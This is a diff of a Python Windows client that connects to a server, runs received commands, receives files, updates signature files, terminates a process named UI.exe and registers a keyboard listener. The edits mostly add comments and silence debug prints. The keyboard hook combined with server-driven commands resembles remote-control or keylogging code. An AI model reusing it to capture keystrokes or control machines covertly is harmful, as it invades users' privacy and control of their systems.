@@ -26,6 +26,8 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 # function to return decoded utf-8
 decode_utf8 = lambda data: data.decode("utf-8")
 
+
+#tr connecting to a socket 
 def create_socket():
     global objSocket 
     try:
@@ -38,7 +40,6 @@ def create_socket():
     except socket.error:
         return
 
-      # delete data after it has been sent
 
 
 def OnKeyboardEvent(event):
@@ -67,6 +68,7 @@ KeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)
 Key = pynput.keyboard.Key
 
 
+#To receive a larger file
 def recvall(buffer,objSocket):  # function to receive large amounts of data
     bytData = b""
     while True:
@@ -77,6 +79,8 @@ def recvall(buffer,objSocket):  # function to receive large amounts of data
         if len(bytData) == buffer:
             return bytData
 
+
+#to receive a file
 def upload(data):
     intBuffer = int(data)
     file_data = recvall(intBuffer,objSocket)
@@ -96,12 +100,12 @@ def upload(data):
         saveTransaction()
         fileChanged = 1
     
-    print (objSocket)
+    # print (objSocket)
     objSocket.close()
-    print (objSocket)
+    # print (objSocket)
     time.sleep(5)
-    # sys.exit(0)
 
+#Function to add a transaction in the log file. 
 def saveTransaction():
     currentDT = datetime.datetime.now()
     currentDT = str(currentDT)
@@ -130,7 +134,7 @@ def saveTransaction():
     i = 0
     for process in c.Win32_Process ():
         if (process.Name == 'UI.exe'):
-            print('its found')
+            # print('its found')
             result = process.Terminate()
             if(i == 0):
 
@@ -138,6 +142,7 @@ def saveTransaction():
                 i+=1
 
 
+#TO transfer the signature from temporary file to the signature file if the signature is a new one.
 def transferFiles():
     with open ("tempSignatures.txt",'r') as f1:
         data = f1.read()
@@ -146,20 +151,27 @@ def transferFiles():
             f2.close()
         f1.close()
 
+
+#Compare the signature file if the received file is a new one or an old one.
 def compareFiles():
+
+    #open the temporary signature file and check the last signature received.
     with open("tempSignatures.txt",'r') as f:
         lines = f.read().splitlines()
         lastTempSignature = lines[-1]
 
+    #get the last file of the signature file
     with open("signatures.txt",'r') as f:
         lines = f.read().splitlines()
         lastSignature = lines[-1]
 
+    #Receive the last line of both the the files
     if(lastTempSignature == lastSignature):
         return True
     else:
         return False
 
+#To recive the command sent from the server and execute the function accordingly
 def execute_command():
     # try:
     strData = objSocket.recv(1024)
@@ -169,9 +181,3 @@ def execute_command():
         sys.exit(0)
     elif strData[:4] == "send":
         upload(strData[4:])
-    # except socket.error:  # if the server closes without warning
-    #     objSocket.close()
-    #     sys.exit(0)
-
-
-# create_socket()
